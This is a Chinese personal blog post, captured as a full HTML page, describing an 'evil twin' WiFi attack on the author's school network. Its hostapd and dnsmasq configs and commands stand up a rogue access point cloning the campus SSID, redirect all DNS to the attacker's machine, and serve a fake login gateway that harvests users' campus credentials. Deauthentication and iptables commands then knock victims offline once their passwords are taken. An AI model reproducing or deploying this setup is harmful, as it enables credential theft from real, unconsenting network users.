<!DOCTYPE html>
<html>
<head>
  <title>NULLNE</title>
  <!-- Standard Meta -->
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <meta name="author" content="nullne">

  <!-- Site Properties -->
  <link rel="icon" href="/theme/img/favicon.png">
  <link rel="stylesheet" type="text/css" href="/theme/semantic.min.css">
  <link rel="stylesheet" type="text/css" href="/theme/main.css">
<link rel="stylesheet" type="text/css" href="/theme/pygment.css">

<style type="text/css">
.masthead.segment.bg:after {
    background-image: url('/background/Hand of Midas.jpg');
}
</style>


  <script src="/theme/jquery-2.1.4.min.js"></script>
  <script src="/theme/semantic.min.js"></script>
<script>
$(document)
    .ready(function() {
        $('.card .dimmer')
            .dimmer({
                on: 'hover'
            })
        ;
        $('.ui.sticky')
            .sticky({
                context: '#allude',
                offset: 63,
            })
        ;
    });
</script>
  <script>
  $(document)
    .ready(function() {
        // change copyleft
        var now = new Date();
        var copyleft = $('.copyleft').html().replace(/2013.*/, "2013 - " + now.getFullYear());
        $('.copyleft').html(copyleft)


        $('div.search').keypress(function(e) {
            if(e.which == 13) {
                var q = $(this).find('input').val()
                if (q.length !== 0) {
                    window.location.href = "/search.html?q=" + q;
                }
            }
        });
        // fix menu when passed
        $('.masthead')
            .visibility({
                once: false,
                onBottomPassed: function() {
                    $('.fixed.menu').transition('fade in');
                },
                onBottomPassedReverse: function() {
                    $('.fixed.menu').transition('fade out');
                }
            })
        ;
    })
  ;
  </script>
  <!-- Feeds -->
  <link href="/all-atom.xml" type="application/atom+xml" rel="alternate" title="NULLNE Atom Feed" />



</head>
<body>

<!-- Following Menu -->
<div class="ui top fixed hidden menu">
  <div class="ui container">
      <a href="/" class="header item">
          Home
      </a>

      <!-- pages -->
      <a class="item " href="/category/suo-sui.html">琐碎</a>
      <a class="item  active" href="/category/hand-of-midas.html">Hand of Midas</a>
      <a class="item " href="/category/dear-diary.html">Dear Diary</a>

      <a class="item" href="/about.html">About</a>
    <div class="right item">
        <div class="ui small search">
            <div class="ui icon input">
                <input class="prompt" type="text" placeholder="Find something...">
                <i class="search icon"></i>
            </div>
        </div>
    </div>
  </div>
</div>

<!-- Page Contents -->
<div class="pusher">
  <div class="ui inverted vertical masthead center aligned segment bg" id="bg">

    <div class="ui container">
      <div class="ui large secondary inverted menu">
          <!-- 
         <a class="toc item">
           <i class="sidebar icon"></i>
         </a>
         -->
         <a href="/" class="item">
             Home
         </a>

        <!-- pages -->
        <a class="item " href="/category/suo-sui.html">琐碎</a>
        <a class="item  active" href="/category/hand-of-midas.html">Hand of Midas</a>
        <a class="item " href="/category/dear-diary.html">Dear Diary</a>

        <a class="item" href="/about.html">About</a>
        <div class="right item">
            <div class="ui small search">
                <div class="ui icon input">
                    <input class="prompt" type="text" placeholder="Find something...">
                    <i class="search icon"></i>
                </div>
            </div>
        </div>
      </div>
    </div>

    <div class="ui text container">
<h1 class="ui inverted header">
    WIFI 热点欺骗
</h1>
    </div>

  </div>

  <div class="ui hidden divider"></div>

<div class="ui basic segment" id="allude" style="">
  <div class="right ui rail" style="">
      <div class="ui sticky" style="">
          <div class="ui card">
              <div class="ui slide right reveal image">
                  <div class="visible content">
                      <img class="ui fluid image" src="/theme/img/big-avatar.jpg">
                  </div>
                  <div class="hidden content">
                      <img class="ui fluid image" src="/theme/img/alipay.png">
                  </div>
              </div>

              <div class="content">
                  <a href="/about.html" class="header">nullne</a>
                  <div class="meta">
                      <span class="date">Nov 23, 2014</span>
                  </div>
              </div>
              <div class="extra content">
 
                  Tags:&nbsp;
                  <a href="/tag/wifi.html" class="">WIFI</a>,&nbsp;
                  <a href="/tag/linux.html" class="">Linux</a>,&nbsp;
 
              </div>
          </div>
      </div>
  </div>
  <div class="ui text container"><p><em>很久以前看过一篇关于WIFI脆弱性的<a href="http://fex.baidu.com/blog/2014/04/traffic-hijack/">介绍</a>(找了好久终于被我找到了)，其中有一部分讲的是由于本身协议的弱点，相同 ssid 的热点会被合并为同一个，至于用户最终连接哪个热点取决于他所能接收到的信号强度。不知道此刻各位看官脑洞有没有大开？</em></p>
<p><em>俗话说杀生不如宰熟，所以直接就向学校 ap 下手了。提前声明几个全局变量：</em></p>
<div class="highlight"><pre><span></span><span class="n">ssid</span><span class="o">:</span> <span class="n">NICESHOT</span>
<span class="n">os</span><span class="err">：</span> <span class="n">ubuntu</span>
</pre></div>


<h3>简单部署</h3>
<h4>用 hostapd 建立热点</h4>
<blockquote>
<p>“<strong>hostapd</strong> is a user space daemon for access point and authentication servers. “</p>
</blockquote>
<div class="highlight"><pre><span></span>sudo apt-get install hostapd
</pre></div>


<p>更改配置文件 <em>/etc/hostapd-hotspot.conf</em> 如下：</p>
<div class="highlight"><pre><span></span># WiFi Hotspot
interface=wlan0
driver=nl80211
#Access Point
ssid=NICESHOT
hw_mode=g
# WiFi Channel:
channel=1
#macaddr_acl=0
auth_algs=1
wmm_enabled=0
#ignore_broadcast_ssid=0
#wpa=3
#wpa_passphrase=1
#wpa_key_mgmt=WPA-PSK
#wpa_pairwise=TKIP
#rsn_pairwise=CCMP
ctrl_interface=/var/run/hostapd
</pre></div>


<p>可能还需要更改 <em>/etc/default/hostapd</em> 为</p>
<div class="highlight"><pre><span></span>DAEMON_CONF=/etc/hostapd/hostapd.conf
</pre></div>


<p>然后测试配置文件<code>hostapd -d /etc/hostapd-hotspot.conf</code>,  没有什么问题的话就可以启动服务了</p>
<div class="highlight"><pre><span></span>service hostapd start
</pre></div>


<h4>微型 DNCP &amp; DNS -- dnsmasq</h4>
<blockquote>
<p>Dnsmasq is a free software DNS forwarder and DHCP server for small networks. It is considered to be easily configured, with low system resource usage.</p>
</blockquote>
<div class="highlight"><pre><span></span>sudo apt-get install dnsmasq
</pre></div>


<p>更改配置文件 <em>/etc/dnsmasq.conf</em></p>
<div class="highlight"><pre><span></span>log-facility=/var/log/dnsmasq.log
address=/#/192.168.1.1
interface=wlan0                                                                             
dhcp-range=192.168.1.20,192.168.1.254,12h
no-resolv 
</pre></div>


<p>然后比较关键的是配置 <strong>wlan0</strong> IP 地址 <code>ifconfig wlan0 192.168.1.1</code>。</p>
<p>稍微总结一下，到此为止，我们做了这么些事情：创建 WFIFI 热点，监听 <strong>wlan0</strong> 口，然后通过配置DHCP给所有连接到此 AP 的终端分配IP地址。另外上面的这条配置<code>address=/#/192.168.1.1</code>，将所有地址解析到我们的电脑 IP。</p>
<h4>搭建服务器</h4>
<p>此处就不详说了，最终达到的效果是访问 <code>192.168.1.1</code>是我们的钓鱼网站。</p>
<p>因为校园网需要登陆，也就是说连接校园 AP 之后将所有 HTTP 页面跳转到网关登陆界面。所以我们也部署一个一模一样的登陆网关，然后所有连接的用户跟往常一样登陆网关，神不知鬼不觉得就把账号密码泄露过来了。稍后我会分享此处的简单代码 DEMO 到 GitHub。</p>
<h3>进阶</h3>
<p>当然不能停止在这么简陋的东西上面，我们需要更进一步。</p>
<h4>粗暴的强制下线</h4>
<p>毕竟我们只有一个无线网卡，用作 AP 之后就不能接入其他网络了，环境也不允许拉一根网线，用户登录网关之后根本没办法继续上网，很快你的伪 AP 就会被发现。所以我们强制所有登录网关，也就是被我们窃取密码的用户离线。</p>
<div class="highlight"><pre><span></span>hostapd_cli deauthenticate 38:bc:1a:88:12:61                                                     
iptables -A INPUT -m mac --mac-source 38:bc:1a:88:12:61 -j DROP
</pre></div>


<p>第一句强制用户离线，之前在配置 hostapd 的时，这句就是为了达到这个目的 <code>ctrl_interface=/var/run/hostapd</code>，第二句将所有该设备的请求丢弃。这就是当一个人丧失所有利用价值之后的下场！</p>
<h4>配置更为合理的 iptables（还没有实现）</h4>
<p>当然，前提是我们自己的电脑还可以通过其他口，比如 <em>eth0</em>，访问正常网络。</p>
<p>通过配置合理强大的 <strong>iptables</strong>,精心布局，我们不仅仅获取网关密码这么简单的并且还需要特别严格苛刻的场景的蛋糕。拭目以待。。。</p>
<h3>思考</h3>
<h3>后记</h3>
<h4>伤敌一百，自损三千</h4>
<p>因为自己的装备跟技术很挫，在配置之前那些东西的时候碰到了一些问题，险些出师未捷身先死。</p>
<p>在 ubuntu 下，<code>service networking restart</code>,然后你就各种问题爽翻天
- 现在，至少目前为止插上网线之后还需要 <code>ifup eth0</code> 才能通过有线上网
- 现在，至少目前为止我连接 WIFI 的时候需要这么做（运气好的话差不多能连接上）</p>
<div class="highlight"><pre><span></span>ifup wlan0   #up the wlan port 
iwlist wlan0 scan #list availabel wifi ssid
iwconfig wlan0 essid &quot;NICESHOT&quot;  #no password
iwconfig wlan0 ssid &quot;NICESHOT&quot; key password   #with password
dhcpclient wlan0   #get ip via dhcp 
</pre></div>


<ul>
<li>电脑里面出现了奇怪的端口:wlan0:avahi</li>
<li>系统自带的 network-manager 罢工了</li>
<li>其他未知错误待续</li>
</ul></div>
</div>
<div class="ui hidden divider"></div>



<h4 class="ui horizontal divider header">
    <i class="comment icon"></i>
    留下你的评论
</h4>

<!-- google plus comment -->
<div class="ui two column centered grid" id="google-comment">
    <div id="comments" class="column">
        <div class="ui brown icon  message" style="display: none;" id="gfw">
            <i class="notched circle loading icon"></i>
            <ul class="list">
                <li>这儿本来是Google Comments</li>
                <li>EMBARRASSED about the Great Fire Wall...</li>
                <li>但是不会翻墙就是你的不对了</li>
            </ul>
        </div>
    </div>
</div>

  <div class="ui hidden divider"></div>

  <div class="ui inverted vertical footer segment">
    <div class="ui container">
      <div class="ui stackable inverted divided equal height stackable grid">
        <div class="three wide column">
          <h4 class="ui inverted header">Blogroll</h4>
          <div class="ui inverted link list">
              <a href="http://zonca.github.io/" class="item">&nbsp;Zonca</a>
              <a href="http://moparx.com/" class="item">&nbsp;Moparx</a>
              <a href="http://blog.friparia.com/" class="item">&nbsp;Friparia</a>
          </div>
        </div>
        <div class="three wide column">
          <h4 class="ui inverted header">Social</h4>
          <div class="ui inverted link list">
              <a href="https://github.com/nullne" class="item">&nbsp;Github</a>
              <a href="https://www.linkedin.com/pub/le-yu/89/980/1a5" class="item">&nbsp;LinkedIn</a>
              <a href="http://www.douban.com/people/nullnes/" class="item">&nbsp;豆瓣</a>
              <a href="http://weibo.com/nullne" class="item">&nbsp;微博</a>
          </div>
        </div>
        <div class="seven wide column">
                <div class="poem head">从前慢</div>
                <div class="poem"><br>木心</div>
            　　<div class="poem">&nbsp;</div>
                <div class="poem">记得早先少年时</div>
            　　<div class="poem">&nbsp;</div>
                <div class="poem">大家诚诚恳恳</div>
            　　<div class="poem">说一句 是一句</div>
            　　<div class="poem">&nbsp;</div>
            　　<div class="poem">清早上火车站</div>
            　　<div class="poem">长街黑暗无行人</div>
            　　<div class="poem">卖豆浆的小店冒着热气</div>
            　　<div class="poem">&nbsp;</div>
            　　<div class="poem">从前的日色变得慢</div>
            　　<div class="poem">车<br>，马<br>，邮件都慢</div>
            　　<div class="poem">一生只够爱一个人</div>
            　　<div class="poem">&nbsp;</div>
            　　<div class="poem">从前的锁也好看</div>
            　　<div class="poem">钥匙精美有样子 </div>
            　　<div class="poem">你锁了 人家就懂</div>
                <div class="clear"></div>
        </div>
      </div>
    </div>
      <div class="ui inverted section divider"></div>
      <div class="ui centered align grid">
          <p class="copyleft">&copy; nullne 2013-</p>
      </div>
  </div>
</div>


<script>
var timeout = 30;
poll = function () {
  setTimeout(function () {
    timeout--;
    if (typeof gapi !== 'undefined') {
      // External file loaded
        $('#gfw').remove()
    }
    else if (timeout > 0) {
      poll();
    }
    else {
      // External library failed to load
        $('#gfw').show()
    }
  }, 100);
};

poll();
</script>
<script src="https://apis.google.com/js/plusone.js"></script>
<script>
gapi.comments.render('comments', {
    href: window.location,
    width: 624,
    height: 250,
    first_party_property: 'BLOGGER',
    view_type: 'FILTERED_POSTMOD'
});
$('#gfw').remove()

</script>
</body>

</html>